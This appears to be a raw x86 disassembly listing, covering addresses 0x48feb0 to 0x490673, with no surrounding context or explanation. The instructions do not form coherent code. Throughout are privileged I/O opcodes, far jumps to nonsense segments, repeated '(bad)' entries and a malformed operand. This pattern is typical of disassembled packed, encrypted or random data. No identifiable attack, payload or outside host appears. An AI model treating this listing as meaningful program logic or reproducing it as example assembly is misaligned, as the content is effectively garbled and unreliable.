  48feb0:	pusha  
  48feb1:	dec    esi
  48feb2:	js     0x48feb9
  48feb4:	jo     0x48fefb
  48feb6:	daa    
  48feb7:	jmp    0x48fe48
  48feb9:	add    DWORD PTR [eax+ecx*1+0x17],eax
  48febd:	dec    esi
  48febe:	xchg   edi,eax
  48febf:	pop    ss
  48fec0:	cli    
  48fec1:	or     eax,0x9b26c407
  48fec6:	lahf   
  48fec7:	in     eax,dx
  48fec8:	imul   ebp,DWORD PTR [eax-0xc3957ef],0xffffff8c
  48fecf:	push   edi
  48fed0:	shl    DWORD PTR [ecx+0x3c],cl
  48fed3:	or     DWORD PTR [edx-0x76ec5533],0x48db3200
  48fedd:	fsub   DWORD PTR [ecx-0x1f44314f]
  48fee3:	ja     0x48fef5
  48fee5:	jne    0x48ff3e
  48fee7:	jmp    0xf75b:0x7409687e
  48feee:	xchg   ah,ch
  48fef0:	push   ss
  48fef1:	or     esi,0x802e560f
  48fef7:	inc    esp
  48fef8:	add    bl,ah
  48fefa:	data16 loopne 0x48feef
  48fefd:	mov    BYTE PTR [esi],dl
  48feff:	pop    esi
  48ff00:	adc    BYTE PTR [ebp-0x6f],ch
  48ff03:	call   0xe8644d1e
  48ff08:	sbb    BYTE PTR [eax],dh
  48ff0a:	cmp    cl,ah
  48ff0c:	icebp  
  48ff0d:	push   es
  48ff0e:	das    
  48ff0f:	test   eax,0x15ffecf8
  48ff14:	and    ebp,ebx
  48ff16:	sub    al,0x81
  48ff18:	out    0x6b,al
  48ff1a:	cmp    al,0xb4
  48ff1c:	add    DWORD PTR [eax+0x48568a5],edi
  48ff22:	ror    DWORD PTR [edi],cl
  48ff24:	adc    edi,edx
  48ff26:	test   DWORD PTR ds:0xef1b7d8,esi
  48ff2c:	gs popa 
  48ff2e:	nop
  48ff2f:	loopne 0x48ff78
  48ff31:	mov    edi,db4
  48ff34:	lods   eax,DWORD PTR ds:[esi]
  48ff35:	add    ebp,edi
  48ff37:	ret    
  48ff38:	es loope 0x48ff1c
  48ff3b:	pushf  
  48ff3c:	pop    esp
  48ff3d:	repnz idiv DWORD PTR [ebx]
  48ff40:	nop
  48ff41:	in     al,dx
  48ff42:	dec    edi
  48ff43:	mov    DWORD PTR [eax-0x42171714],edx
  48ff49:	mov    eax,ds:0x226386a3
  48ff4e:	aas    
  48ff4f:	je     0x48ff6a
  48ff51:	adc    DWORD PTR [edi-0x865cfdf],ebx
  48ff57:	mov    eax,0x105005c9
  48ff5c:	or     al,0x56
  48ff5e:	mov    dl,0x4a
  48ff60:	or     cl,ch
  48ff62:	in     al,0x2
  48ff64:	sub    DWORD PTR [ebx-0x56e06e1],0x4c443d2c
  48ff6e:	into   
  48ff6f:	xchg   edi,eax
  48ff70:	loopne 0x48ff61
  48ff72:	add    ebp,eax
  48ff74:	nop
  48ff75:	rcl    ebx,cl
  48ff77:	mov    dl,0x5
  48ff79:	adc    ebx,edi
  48ff7b:	pop    esp
  48ff7c:	mov    al,ds:0x504dba14
  48ff81:	cmp    BYTE PTR [edx+0x20942303],dh
  48ff87:	add    al,dh
  48ff89:	xchg   edi,eax
  48ff8a:	sub    BYTE PTR [ebp-0x59aa9cb4],ch
  48ff90:	inc    edi
  48ff91:	xor    cl,bh
  48ff93:	mov    al,al
  48ff95:	mov    ch,0x0
  48ff97:	dec    edi
  48ff98:	fidiv  DWORD PTR [ecx+0x238645ac]
  48ff9e:	popa   
  48ff9f:	repnz aas 
  48ffa1:	fadd   DWORD PTR [eax-0x72be378b]
  48ffa7:	inc    ebp
  48ffa8:	hlt    
  48ffa9:	xor    edx,DWORD PTR [eax-0x5f]
  48ffac:	xchg   edx,eax
  48ffad:	(bad)  
  48ffae:	fild   WORD PTR [eax+0x7d1aeb0a]
  48ffb4:	pop    ecx
  48ffb5:	push   ecx
  48ffb6:	in     al,0x37
  48ffb8:	xor    dh,ch
  48ffba:	and    BYTE PTR [eax+0x500b27aa],ah
  48ffc0:	and    eax,DWORD PTR [eax]
  48ffc2:	lods   al,BYTE PTR ds:[esi]
  48ffc3:	mov    dl,BYTE PTR [edx+ebx*1-0x2c]
  48ffc7:	or     bl,ch
  48ffc9:	or     bl,BYTE PTR [ecx+ebx*1+0x74]
  48ffcd:	add    ecx,DWORD PTR [edx-0x476bb52d]
  48ffd3:	mul    BYTE PTR [ebx]
  48ffd5:	sub    eax,0xc6430467
  48ffda:	fiadd  WORD PTR [edx-0x7d]
  48ffdd:	inc    esp
  48ffde:	push   cs
  48ffdf:	adc    edx,ebp
  48ffe1:	loopne 0x49001a
  48ffe3:	clc    
  48ffe4:	jge    0x490055
  48ffe6:	sti    
  48ffe7:	dec    ebp
  48ffe8:	fs mov edx,0x8074f1f9
  48ffee:	adc    eax,0x2392021b
  48fff3:	ror    BYTE PTR [eax+0xe],1
  48fff6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48fff7:	jnp    0x49004f
  48fff9:	(bad)  
  48fffb:	mov    ebp,0x8a271135
  490000:	je     0x49000f
  490002:	test   BYTE PTR [ebx+0x75fe4471],ch
  490008:	ins    DWORD PTR es:[edi],dx
  490009:	pop    ebx
  49000a:	sub    edx,DWORD PTR [ebx]
  49000c:	fisttp DWORD PTR [eax+0x2dc64bdf]
  490012:	pusha  
  490013:	add    cl,BYTE PTR [eax-0x29]
  490016:	in     eax,dx
  490017:	add    BYTE PTR [ebx+0x62],ch
  49001a:	mov    eax,0x181a5459
  49001f:	and    BYTE PTR [ebp-0x63],dl
  490022:	mov    ch,0xd3
  490024:	pop    ecx
  490025:	xor    cl,ah
  490027:	jg     0x49004a
  490029:	mov    al,ds:0x8fdd6fa9
  49002e:	and    ecx,0x10d51d8
  490034:	daa    
  490035:	fsubr  st,st(1)
  490037:	and    eax,esp
  490039:	sbb    eax,esp
  49003b:	nop
  49003c:	xchg   esp,eax
  49003d:	lea    ebp,[ebx]
  49003f:	ret    0xc79a
  490042:	push   edi
  490043:	push   edi
  490044:	sub    dh,BYTE PTR [eax]
  490046:	add    ebp,DWORD PTR [ecx]
  490048:	jns    0x4900a4
  49004a:	mov    esp,0x3c37c207
  49004f:	aam    0x24
  490051:	das    
  490052:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  490053:	push   edx
  490054:	cmp    DWORD PTR [edx],esi
  490056:	add    eax,0x74747d27
  49005b:	outs   dx,BYTE PTR ds:[esi]
  49005c:	add    eax,0x5d1763c2
  490061:	fnstcw WORD PTR [esi+0x52]
  490064:	cmp    eax,0x14d0fa93
  490069:	pop    ds
  49006a:	loope  0x490073
  49006c:	mov    dl,0x40
  49006e:	adc    dh,cl
  490070:	ss mov dl,0x1
  490073:	add    al,0xb6
  490075:	push   cs
  490076:	and    eax,edx
  490078:	scas   al,BYTE PTR es:[edi]
  490079:	test   bh,dl
  49007b:	ins    BYTE PTR es:[edi],dx
  49007c:	sbb    bl,BYTE PTR [eax+0x38]
  49007f:	int    0xf7
  490081:	pop    ebx
  490082:	jo     0x49008d
  490084:	ss or  dl,al
  490087:	cdq    
  490088:	add    ah,BYTE PTR [eax-0x41]
  49008b:	sbb    BYTE PTR [edx+esi*1],al
  49008e:	int    0x2f
  490090:	jnp    0x490096
  490092:	cmp    esi,DWORD PTR [edi+0x58434208]
  490098:	das    
  490099:	sbb    DWORD PTR [edx-0x2acb037e],eax
  49009f:	mov    eax,edi
  4900a1:	or     edx,0xffffffff
  4900a4:	mov    ds:0xba71155b,eax
  4900a9:	pop    ds
  4900aa:	mov    al,0x13
  4900ac:	pusha  
  4900ad:	and    esi,DWORD PTR [eax]
  4900af:	in     al,0xd2
  4900b1:	fsubr  st(5),st
  4900b3:	sbb    al,BYTE PTR [esi]
  4900b5:	or     al,0x28
  4900b7:	imul   ebx,DWORD PTR [ecx+0x60fdee06],0x16
  4900be:	sub    eax,0x7da8afff
  4900c3:	loop   0x49005e
  4900c5:	mov    ds:0x2504877b,al
  4900ca:	jmp    0x49013a
  4900cc:	sbb    al,0x51
  4900ce:	cld    
  4900cf:	sbb    al,0xe4
  4900d1:	pop    ecx
  4900d2:	push   cs
  4900d3:	cld    
  4900d4:	cld    
  4900d5:	inc    ebx
  4900d6:	add    al,0x57
  4900d8:	xor    ah,BYTE PTR [ebx+eax*4]
  4900db:	cld    
  4900dc:	cld    
  4900dd:	cld    
  4900de:	push   0xfc207263
  4900e3:	add    BYTE PTR [eax+edx*4-0x232608bd],ah
  4900ea:	xor    dl,BYTE PTR [eax]
  4900ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4900ed:	scas   eax,DWORD PTR es:[edi]
  4900ee:	call   DWORD PTR [ecx-0x24]
  4900f1:	inc    ebp
  4900f2:	lea    esi,[edi-0x14]
  4900f5:	cmp    BYTE PTR [ebx-0xfa7bc09],dl
  4900fb:	stc    
  4900fc:	mov    eax,ds:0x26d5ad15
  490101:	sbb    DWORD PTR [ebp+0x18],0xffffffd4
  490105:	and    BYTE PTR [eax+0x31],ah
  490108:	pop    ss
  490109:	dec    BYTE PTR [esi]
  49010b:	dec    ebp
  49010c:	lock xchg esp,eax
  49010e:	jns    0x490150
  490110:	jmp    0x490165
  490112:	call   0x97494a6e
  490117:	add    al,0xcd
  490119:	cwde   
  49011a:	mov    edx,DWORD PTR [eax+ebp*2-0x75]
  49011e:	add    al,0xf
  490120:	das    
  490121:	pop    eax
  490122:	push   0xffffff97
  490124:	enter  0x38c7,0x67
  490128:	das    
  490129:	call   0x9f2b:0x8a76316
  490130:	iret   
  490131:	fadd   st,st(7)
  490133:	push   ss
  490134:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  490135:	adc    eax,0x3c2820d5
  49013a:	imul   ebx,ebp,0xc8373564
  490140:	daa    
  490141:	sti    
  490142:	test   eax,0x11d8a916
  490147:	jle    0x490171
  490149:	pop    edi
  49014a:	sub    BYTE PTR [edx],al
  49014c:	xor    al,0x90
  49014e:	adc    al,0x5f
  490150:	mov    esp,0xa1bdc093
  490155:	jo     0x4901cd
  490157:	mov    DWORD PTR ds:[eax],0xce0fe1a0
  49015e:	mov    al,0x66
  490160:	sbb    bh,BYTE PTR [ebx+ebx*1-0x54]
  490164:	pop    edi
  490165:	rcr    DWORD PTR [ebp-0x2a],1
  490168:	add    ecx,DWORD PTR [esi+0x985eb4]
  49016e:	cmp    al,0x89
  490170:	and    eax,0x1d4d496e
  490175:	nop
  490176:	or     DWORD PTR [ecx+0x58545090],ebx
  49017c:	sbb    al,0x22
  49017e:	cdq    
  49017f:	cwde   
  490180:	jl     0x4901e3
  490182:	push   0x5a
  490184:	fidiv  DWORD PTR es:[ecx+0x4026f54d]
  49018b:	loopne 0x49010f
  49018d:	xchg   BYTE PTR [eax+0x31],cl
  490190:	inc    ebx
  490191:	cmp    DWORD PTR [ecx+0x35151ad2],edx
  490197:	test   BYTE PTR [ecx+0x23b7ec4c],dl
  49019d:	mov    BYTE PTR [edi-0x68540877],ah
  4901a3:	add    al,0xd6
  4901a5:	add    al,0x8b
  4901a7:	popa   
  4901a8:	pop    ss
  4901a9:	nop
  4901aa:	or     ebp,DWORD PTR [ecx-0xa]
  4901ad:	shl    ah,1
  4901af:	mov    ah,0x1e
  4901b1:	mov    BYTE PTR [eax-0x6a6aea75],al
  4901b7:	test   DWORD PTR [edi],ecx
  4901b9:	mov    edx,0x5f81302b
  4901be:	test   DWORD PTR [eax+0x43],edi
  4901c1:	imul   ebx,DWORD PTR es:[edi-0x7b77eb8b],0xdb939393
  4901cc:	inc    ebp
  4901cd:	push   esp
  4901ce:	(bad)  
  4901d0:	dec    esp
  4901d1:	xor    BYTE PTR [esi],ah
  4901d3:	mov    al,ds:0x7c349393
  4901d8:	pop    eax
  4901d9:	dec    ebx
  4901da:	enter  0xe92f,0x80
  4901de:	push   ds
  4901df:	inc    ebp
  4901e0:	pop    eax
  4901e1:	mov    edx,edi
  4901e3:	and    al,0xb
  4901e5:	retf   
  4901e6:	adc    eax,0x92c55933
  4901eb:	add    al,0xd2
  4901ed:	adc    BYTE PTR [ebx-0x57f0bd90],bh
  4901f3:	adc    BYTE PTR [edi+0x4c087917],cl
  4901f9:	pusha  
  4901fa:	inc    ebp
  4901fb:	add    DWORD PTR [eax+ebx*8+0xb05ad28],ecx
  490202:	mov    gs,WORD PTR [edx+0x1]
  490205:	add    edi,DWORD PTR [ecx-0x3c9e259c]
  49020b:	(bad)  
  49020c:	pop    ss
  49020d:	dec    ebp
  49020e:	dec    esp
  49020f:	inc    eax
  490210:	xchg   edx,eax
  490211:	dec    ebx
  490212:	cs dec edi
  490214:	dec    esi
  490215:	xchg   edx,eax
  490216:	or     ebx,ecx
  490218:	js     0x4901a9
  49021a:	xchg   BYTE PTR [eax-0x13],bl
  49021d:	lea    esp,[ebp+0x60]
  490220:	pop    eax
  490221:	shl    DWORD PTR [ebp+0xc],cl
  490224:	push   0x50
  490226:	push   ebx
  490227:	xchg   esi,eax
  490228:	push   cs
  490229:	sub    eax,0x4c96a723
  49022e:	jb     0x4901fc
  490230:	inc    edi
  490231:	dec    esp
  490232:	dec    esp
  490233:	pop    eax
  490234:	mov    bl,BYTE PTR [edx+esi*8+0x36]
  490238:	push   eax
  490239:	push   eax
  49023a:	add    DWORD PTR [esi+0x4362167d],eax
  490240:	push   0xad08891b
  490245:	inc    ecx
  490246:	(bad)  
  490247:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  490248:	mov    dl,0x9a
  49024a:	and    DWORD PTR [edx+0x44a6953c],edx
  490250:	fs jo  0x4902c3
  490253:	xchg   edx,eax
  490254:	xchg   DWORD PTR [esi-0x7c],esi
  490257:	ss gs pop ebx
  49025a:	iret   
  49025b:	xor    BYTE PTR [edx+edx*8],bl
  49025e:	test   DWORD PTR [edx+0x4b],esp
  490261:	xor    eax,0x614a4c35
  490266:	mov    eax,es
  490268:	mov    bl,0xaf
  49026a:	jbe    0x490247
  49026c:	dec    eax
  49026d:	fld    TBYTE PTR [edi+0x10]
  490270:	dec    ebp
  490271:	adc    cl,BYTE PTR [ebp-0x10]
  490274:	cmp    al,BYTE PTR [ebx]
  490276:	xchg   edi,eax
  490277:	ss mov ebp,0xde10251e
  49027d:	dec    ebp
  49027e:	test   bl,al
  490280:	adc    BYTE PTR [ebx],bl
  490282:	inc    esi
  490283:	adc    BYTE PTR [edi+0x147a9b89],al
  490289:	xchg   edi,eax
  49028a:	test   eax,0x546f0e7b
  49028f:	leave  
  490290:	das    
  490291:	pop    ss
  490292:	xchg   edx,eax
  490293:	cmp    BYTE PTR [eax+eiz*2-0x78],al
  490297:	xlat   BYTE PTR ds:[ebx]
  490298:	call   0x94d0e1b4
  49029d:	push   ds
  49029e:	inc    ebp
  49029f:	pusha  
  4902a0:	mov    ebx,0x6d20be1c
  4902a5:	test   al,0xfb
  4902a7:	out    dx,eax
  4902a8:	push   ecx
  4902a9:	dec    eax
  4902aa:	cmp    eax,0x8057cdb
  4902af:	hlt    
  4902b0:	jle    0x49029d
  4902b2:	cs cmp eax,0x91ad8185
  4902b8:	nop
  4902b9:	mov    edx,0x86f7809c
  4902be:	rcr    BYTE PTR [ebp+0x6f],cl
  4902c1:	aaa    
  4902c2:	xor    BYTE PTR [ebp+0x43883b3f],ah
  4902c8:	sar    edi,0x75
  4902cb:	retf   0xa058
  4902ce:	test   BYTE PTR ss:[ebp-0x61],bl
  4902d2:	add    cl,BYTE PTR [eax]
  4902d4:	nop
  4902d5:	sbb    ah,BYTE PTR [eax+eiz*2+0x5c]
  4902d9:	arpl   di,cx
  4902db:	xor    al,0xf5
  4902dd:	in     eax,dx
  4902de:	inc    edx
  4902df:	jp     0x4902e5
  4902e1:	stos   DWORD PTR es:[edi],eax
  4902e2:	push   cs
  4902e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4902e4:	dec    ecx
  4902e5:	pushf  
  4902e6:	or     DWORD PTR [eax],ebx
  4902e8:	(bad)  
  4902e9:	aam    0x61
  4902eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4902ec:	test   eax,0xd858310b
  4902f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4902f2:	test   eax,0xbad1d337
  4902f7:	or     al,0x40
  4902f9:	lock inc ebp
  4902fb:	outs   dx,BYTE PTR ds:[esi]
  4902fc:	das    
  4902fd:	sbb    al,BYTE PTR [edx+0x4157be75]
  490303:	ret    
  490304:	inc    ecx
  490305:	loop   0x490292
  490307:	push   edi
  490308:	jb     0x490350
  49030a:	gs retf 0xdb2e
  49030e:	outs   dx,BYTE PTR ds:[esi]
  49030f:	push   edi
  490310:	mov    bl,0x40
  490312:	lods   eax,DWORD PTR ds:[esi]
  490313:	nop
  490314:	mov    edi,0x8ec1820b
  490319:	dec    esi
  49031a:	push   ebx
  49031b:	pop    esp
  49031c:	push   eax
  49031d:	jo     0x4902a5
  49031f:	pop    esi
  490320:	sub    DWORD PTR [eax-0x65],eax
  490323:	shl    BYTE PTR [esi-0x446b18b1],cl
  490329:	ins    BYTE PTR es:[edi],dx
  49032a:	fbld   TBYTE PTR [eax+0x791195fd]
  490330:	pop    edi
  490331:	in     al,0xd
  490333:	loopne 0x49038a
  490335:	adc    DWORD PTR [ebx+0x4c4a3478],eax
  49033b:	and    al,0x51
  49033d:	mov    BYTE PTR [ebx+eax*1+0x22],bl
  490341:	gs jp  0x49030f
  490344:	xor    esi,DWORD PTR [eax+esi*2]
  490347:	xor    ecx,DWORD PTR [eax]
  490349:	ins    DWORD PTR es:[edi],dx
  49034a:	jno    0x49037d
  49034c:	inc    eax
  49034d:	dec    ebx
  49034e:	pop    es
  49034f:	adc    ecx,DWORD PTR ds:0x17470891
  490355:	pop    ebx
  490356:	mov    esp,0x35f0b2a0
  49035b:	xchg   edi,eax
  49035c:	mov    esp,DWORD PTR [edi]
  49035e:	mov    cl,0xc8
  490360:	adc    ebx,edx
  490362:	ins    DWORD PTR es:[edi],dx
  490363:	add    DWORD PTR [ebx-0x12f511b6],esp
  490369:	mov    dh,0x68
  49036b:	pusha  
  49036c:	add    cl,cl
  49036e:	cmp    eax,0x48d29dae
  490373:	cmp    ch,0xa
  490376:	cmp    al,0x8d
  490378:	sbb    ebx,eax
  49037a:	ret    0xc1b5
  49037d:	mov    edx,0xac881e70
  490382:	adc    al,0x7b
  490384:	add    DWORD PTR [ebp+0x3d],0x38542d75
  49038b:	int3   
  49038c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49038d:	adc    DWORD PTR [ebx],0x1b6b37ad
  490393:	add    dh,BYTE PTR [edi-0x7a]
  490396:	xor    eax,0x2947f688
  49039b:	pop    es
  49039c:	addr16 jle 0x4903cb
  49039f:	std    
  4903a0:	(bad)  
  4903a1:	fld    DWORD PTR [edx-0x185750c5]
  4903a7:	loopne 0x49041c
  4903a9:	xor    al,0x85
  4903ab:	sbb    DWORD PTR [ebp+0x40],0x89e8384f
  4903b2:	xchg   DWORD PTR [eax-0x21337d4],eax
  4903b8:	adc    eax,0x819213e2
  4903bd:	pop    ebp
  4903be:	popa   
  4903bf:	mov    ah,0x64
  4903c1:	lock pusha 
  4903c3:	xor    edi,DWORD PTR [ecx]
  4903c5:	sub    BYTE PTR [esp+eax*1+0x753ce737],dh
  4903cc:	push   ss
  4903cd:	out    dx,eax
  4903ce:	jno    0x490372
  4903d0:	(bad)  
  4903d1:	(bad)  
  4903d2:	sub    DWORD PTR [edi],eax
  4903d4:	rcl    DWORD PTR [esi-0x6e23c9bc],1
  4903da:	add    DWORD PTR [eax-0x68f8989a],0xffffff8b
  4903e1:	(bad)  
  4903e2:	fcomp  DWORD PTR [eax]
  4903e4:	mov    cl,0xc6
  4903e6:	inc    eax
  4903e7:	in     eax,dx
  4903e8:	(bad)  
  4903e9:	xor    cl,BYTE PTR [ebp+ebx*1+0x21904dbb]
  4903f0:	pop    eax
  4903f1:	xor    al,0x2
  4903f3:	jo     0x490465
  4903f5:	mov    es,WORD PTR [ebx+0x6ec23b66]
  4903fb:	imul   esp,DWORD PTR [edx],0x4d7c33d
  490401:	and    cl,dh
  490403:	nop
  490404:	jne    0x490462
  490406:	fistp  QWORD PTR [eax+0x5d85877d]
  49040c:	gs je  0x49046b
  49040f:	adc    eax,0x36a6db5c
  490414:	inc    ecx
  490415:	sub    al,0x62
  490417:	outs   dx,DWORD PTR ds:[esi]
  490418:	test   al,0x8f
  49041a:	and    DWORD PTR [edx+0x73192024],esp
  490420:	pop    esp
  490421:	inc    edx
  490422:	clc    
  490423:	pop    edx
  490424:	mov    eax,ds:0x6c6e7816
  490429:	sbb    esp,DWORD PTR [eax]
  49042b:	push   eax
  49042c:	scas   eax,DWORD PTR es:[edi]
  49042d:	mov    DWORD PTR [eax],edi
  49042f:	mov    al,0xdf
  490431:	shl    BYTE PTR [eax+0x4b524384],cl
  490437:	pop    esp
  490438:	add    DWORD PTR [ebx],ecx
  49043a:	push   es
  49043b:	push   0x2a
  49043d:	scas   eax,DWORD PTR es:[edi]
  49043e:	dec    sp
  490440:	fsubr  QWORD PTR [edi]
  490442:	lock jo 0x49040a
  490445:	and    BYTE PTR [ebx],bh
  490447:	mov    bl,0x4
  490449:	jne    0x49047a
  49044b:	cmp    DWORD PTR ds:0xa5999525,0x16
  490452:	cs sub eax,0xb1ec1888
  490458:	inc    esi
  490459:	add    esi,DWORD PTR [ebp-0x2da3e8ac]
  49045f:	imul   ebp,DWORD PTR [ebp-0x61],0xffffffdf
  490463:	push   esp
  490464:	push   esp
  490465:	inc    ebp
  490466:	xchg   ebp,eax
  490467:	(bad)  
  490468:	mov    edi,0x83c93351
  49046d:	cli    
  49046e:	dec    DWORD PTR [esi]
  490470:	dec    eax
  490471:	dec    eax
  490472:	or     al,0x18
  490474:	mov    bh,0x29
  490476:	and    BYTE PTR [edx+ecx*4],0x8
  49047a:	mov    ecx,DWORD PTR [ecx]
  49047c:	adc    ch,BYTE PTR [ebp+0x340e77c]
  490482:	sbb    edi,DWORD PTR [ebx]
  490484:	push   ecx
  490485:	add    al,0x75
  490487:	jmp    0xba9a:0xed800575
  49048e:	inc    esi
  49048f:	pusha  
  490490:	jmp    0x490498
  490492:	nop
  490493:	dec    eax
  490494:	xor    cl,al
  490496:	pop    edx
  490497:	loopne 0x49049f
  490499:	mov    ds:0x3b59a784,eax
  49049e:	jae    0x4904e4
  4904a0:	in     eax,0x62
  4904a2:	or     bh,BYTE PTR [eax+0x738966ce]
  4904a8:	js     0x4904a0
  4904aa:	jne    0x490506
  4904ac:	add    al,0x6c
  4904ae:	xchg   edx,eax
  4904af:	cmp    DWORD PTR [ecx+0x254b80b2],0xa1415da8
  4904b9:	and    eax,0x5a5d3ea9
  4904be:	call   0x2710c8af
  4904c3:	adc    al,bh
  4904c5:	call   0x491e333f
  4904ca:	xor    al,0xb8
  4904cc:	push   esi
  4904cd:	scas   eax,DWORD PTR es:[edi]
  4904ce:	ins    DWORD PTR es:[edi],dx
  4904cf:	push   edi
  4904d0:	cmp    esp,edi
  4904d2:	stos   DWORD PTR es:[di],eax
  4904d4:	fiadd  WORD PTR [ecx+0x32]
  4904d7:	cmp    al,0x34
  4904d9:	inc    eax
  4904da:	fisubr DWORD PTR [edx+0x20]
  4904dd:	sub    eax,0x927713eb
  4904e2:	cli    
  4904e3:	les    ecx,FWORD PTR [edi]
  4904e5:	mov    edi,0x9fff18f
  4904ea:	loopne 0x4904ec
  4904ec:	les    eax,FWORD PTR [ebx+0x48]
  4904ef:	cmp    edi,DWORD PTR [ebx+0x575cc324]
  4904f5:	ins    BYTE PTR es:[edi],dx
  4904f6:	gs mov dl,0xca
  4904f9:	retf   
  4904fa:	or     eax,0x808a0e57
  4904ff:	mov    BYTE PTR [esi],ch
  490501:	xor    BYTE PTR [edx+edx*8-0x70],ch
  490505:	adc    eax,0x2d0c49e7
  49050a:	adc    BYTE PTR [edx-0x23e97a40],al
  490510:	xchg   ebp,eax
  490511:	xor    ch,BYTE PTR [esi-0x7d]
  490514:	cmp    al,0x6a
  490516:	pop    ds
  490517:	neg    DWORD PTR [eax]
  490519:	and    DWORD PTR [esi+0x45340bf0],ebx
  49051f:	rcl    bh,1
  490521:	push   edx
  490522:	es ds mov dh,0x1e
  490526:	lods   al,BYTE PTR ds:[esi]
  490527:	jmp    0x49053d
  490529:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49052a:	mov    WORD PTR [edi],cs
  49052c:	xchg   esi,eax
  49052d:	sub    eax,0x6f85c72b
  490532:	(bad)  
  490533:	cmp    ebx,ebx
  490535:	test   DWORD PTR [edi+ebp*2+0x34],ecx
  490539:	es dec ebx
  49053b:	call   FWORD PTR [ebp+0x1c82d207]
  490541:	xor    BYTE PTR [eax],0xf
  490544:	mov    BYTE PTR [edx-0x309c4dec],dh
  49054a:	and    al,0x4b
  49054c:	loope  0x4905bb
  49054e:	ins    BYTE PTR es:[edi],dx
  49054f:	int    0xca
  490551:	popa   
  490552:	out    dx,eax
  490553:	dec    ebx
  490554:	inc    edi
  490555:	mov    ah,0xb7
  490557:	xchg   edx,eax
  490558:	(bad)  
  490559:	pop    ss
  49055a:	dec    edi
  49055b:	xor    eax,0xa306071e
  490560:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  490561:	and    bl,0xfc
  490564:	inc    eax
  490565:	and    DWORD PTR [eax+0x8],ebp
  490568:	icebp  
  490569:	or     eax,0x170a162a
  49056e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49056f:	repz fnclex 
  490572:	push   edi
  490573:	repnz mov dl,0x93
  490576:	add    al,0xd6
  490578:	mov    WORD PTR [eax],es
  49057a:	mov    WORD PTR [eax],es
  49057c:	xlat   BYTE PTR ds:[ebx]
  49057d:	(bad)  
  49057f:	mov    bl,0x8c
  490581:	add    BYTE PTR [esi],cl
  490583:	test   BYTE PTR [eax+0x6c05ab8e],0x78
  49058a:	xchg   esi,eax
  49058b:	inc    ebx
  49058c:	(bad)  
  49058d:	xlat   BYTE PTR ds:[ebx]
  49058e:	or     dh,0x99
  490591:	inc    ebp
  490592:	(bad)  
  490593:	dec    edx
  490594:	sbb    edi,ebp
  490596:	ficomp WORD PTR [ebp-0x62]
  490599:	inc    ecx
  49059a:	and    DWORD PTR [edx+0x10],ecx
  49059d:	test   BYTE PTR [esi],0x15
  4905a0:	fmul   DWORD PTR [eax-0x16]
  4905a3:	jns    0x4905c9
  4905a5:	sub    edi,edx
  4905a7:	push   edx
  4905a8:	inc    esp
  4905a9:	fcomip st,st(1)
  4905ab:	bound  eax,QWORD PTR [ebx]
  4905ad:	les    ecx,FWORD PTR [edi]
  4905af:	lahf   
  4905b0:	shr    ebx,0xe2
  4905b3:	dec    edx
  4905b4:	inc    esp
  4905b5:	add    ecx,DWORD PTR [edx+0x4c]
  4905b8:	imul   ecx,DWORD PTR [edi+0x6c],0x0
  4905bc:	mov    ds:0x249c0fca,eax
  4905c1:	sbb    al,0x3a
  4905c3:	stos   DWORD PTR es:[edi],eax
  4905c4:	imul   ebp,DWORD PTR [edx],0x1140404d
  4905ca:	inc    eax
  4905cb:	dec    eax
  4905cc:	inc    ecx
  4905cd:	mov    ?,edi
  4905cf:	inc    ecx
  4905d0:	lahf   
  4905d1:	cmp    esp,edx
  4905d3:	pusha  
  4905d4:	mov    DWORD PTR [ecx+0x20],eax
  4905d7:	iret   
  4905d8:	int    0x47
  4905da:	lods   eax,DWORD PTR ds:[esi]
  4905db:	jb     0x490603
  4905dd:	xor    DWORD PTR [eax+0x76],edi
  4905e0:	or     bh,ah
  4905e2:	dec    ecx
  4905e3:	sbb    al,0x48
  4905e5:	call   0xbd5b3615
  4905ea:	adc    eax,DWORD PTR [ecx]
  4905ec:	or     BYTE PTR [esi],ah
  4905ee:	dec    edi
  4905ef:	add    ecx,DWORD PTR [ebx-0x7a31b78d]
  4905f5:	es nop
  4905f7:	das    
  4905f8:	sbb    esp,edi
  4905fa:	or     ch,bl
  4905fc:	pop    es
  4905fd:	mov    ah,0xa1
  4905ff:	jl     0x490609
  490601:	dec    esp
  490602:	push   edx
  490603:	ror    BYTE PTR [ecx-0x49f9c790],cl
  490609:	test   BYTE PTR es:[edx+0x53],cl
  49060d:	js     0x490679
  49060f:	cmp    BYTE PTR [ebx+0x1f590f4a],0xb9
  490616:	sbb    ecx,DWORD PTR [ebx+0x50a9aaf8]
  49061c:	loope  0x490612
  49061e:	push   0x3d
  490620:	mov    ecx,0xa88d17fa
  490625:	int    0xdd
  490627:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  490628:	add    BYTE PTR [edi],bh
  49062a:	mov    ebx,0x4ed3cf8a
  49062f:	sbb    DWORD PTR [esp+ebx*8+0x2e1806c8],0x2d438134
  49063a:	inc    eax
  49063b:	dec    ecx
  49063c:	push   ebp
  49063d:	lock adc ebx,DWORD PTR [eax]
  490640:	cmp    esi,DWORD PTR [esi+eiz*1]
  490643:	cmp    DWORD PTR [ebx],ebx
  490645:	sahf   
  490646:	jge    0x490626
  490648:	inc    edx
  490649:	daa    
  49064a:	je     0x490658
  49064c:	jmp    0x49066d
  49064e:	sbb    eax,DWORD PTR [ecx]
  490650:	xor    bl,ch
  490652:	stos   DWORD PTR es:[edi],eax
  490653:	add    eax,0x29b52067
  490658:	jo     0x4905fd
  49065a:	inc    esi
  49065b:	inc    eax
  49065c:	enter  0x7a91,0xce
  490660:	push   esi
  490661:	repz rcl BYTE PTR [edx],0xc6
  490665:	mov    eax,0x91d6d555
  49066a:	lods   al,BYTE PTR ds:[esi]
  49066b:	xchg   DWORD PTR [edi+0x9],edx
  49066e:	sub    esi,DWORD PTR [ebp+0x38]
  490671:	sub    DWORD PTR [ebx],edi
  490673:	inc    ecx
